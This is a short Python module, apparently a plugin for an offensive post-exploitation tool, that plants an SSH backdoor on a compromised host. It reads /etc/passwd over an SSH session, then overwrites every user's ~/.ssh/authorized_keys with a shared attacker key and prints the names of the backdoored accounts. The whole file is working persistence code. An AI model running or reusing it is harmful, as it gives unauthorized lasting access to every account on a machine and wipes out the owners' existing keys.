import logging
from hyderaddons import shared_pub_key
from hyderaddons import bcolors

class BackdoorUsersSshDir:

    name = "backdoor_users_ssh_dir"
    description = ""
    safe = False

    def run(self, sshclient, args, server):
        logging.debug("Using this public ssh key: %s" % shared_pub_key)
        logging.debug("Gathering users home folder from /etc/passwd")
        _, stdout, _ = sshclient.exec_command("cat /etc/passwd")
        stdout = stdout.read().decode().strip().split("\n")
        homes = []
        for line in stdout:
            line_split = line.split(":")
            if line_split[5]:
                homes.append([line_split[0], line_split[5]])
        cmd = '''mkdir -p %s/.ssh; echo """%s""" > %s/.ssh/authorized_keys'''
        for home in homes:
            sshclient.exec_command(cmd % (home[1], shared_pub_key, home[1]))
        print("Backdoored home folders (added SSH shared key to authorized_keys)")
        print("Users backdoored: " + bcolors.red(",".join([x[0] for x in homes])))
        return True
